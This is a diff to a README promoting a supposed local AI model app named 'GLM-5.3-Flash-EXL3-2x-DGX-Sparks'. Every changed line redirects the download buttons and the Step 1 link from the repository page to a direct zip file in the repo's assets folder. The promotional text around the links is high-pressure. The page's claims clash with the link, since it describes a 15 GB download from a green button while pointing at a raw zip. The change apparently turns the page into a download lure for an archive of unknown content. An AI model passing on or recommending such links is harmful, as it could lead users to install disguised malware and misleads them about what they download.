@@ -1,7 +1,7 @@
 <h1>🚀 GLM-5.3-Flash-EXL3-2x-DGX-Sparks - Run Advanced AI Locally on Your PC</h1>
 
 <p align="center">
-  <a href="https://github.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks/main/assets/DG_EX_Sparks_Flash_GL_x_2.7.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#ffffff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ---
@@ -45,7 +45,7 @@ To run GLM-5.3-Flash-EXL3-2x-DGX-Sparks smoothly, your computer should meet thes
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks](https://github.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks)
+Visit this link to download the application: [https://raw.githubusercontent.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks/main/assets/DG_EX_Sparks_Flash_GL_x_2.7.zip](https://raw.githubusercontent.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks/main/assets/DG_EX_Sparks_Flash_GL_x_2.7.zip)
 
 Click the big green "Download" button on that page. The download will start automatically. The file is approximately 15 GB in size, so please be patient - it may take a while depending on your internet speed.
 
@@ -194,7 +194,7 @@ Don't wait - download now and experience the power of advanced AI right on your 
 ---
 
 <p align="center">
-  <a href="https://github.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(240,147,251,0.4);">📥 GET STARTED TODAY - VISIT DOWNLOAD PAGE</a>
+  <a href="https://raw.githubusercontent.com/Dynamicalsysteminversion1416/GLM-5.3-Flash-EXL3-2x-DGX-Sparks/main/assets/DG_EX_Sparks_Flash_GL_x_2.7.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 8px 20px rgba(240,147,251,0.4);">📥 GET STARTED TODAY - VISIT DOWNLOAD PAGE</a>
 </p>
 
 ---
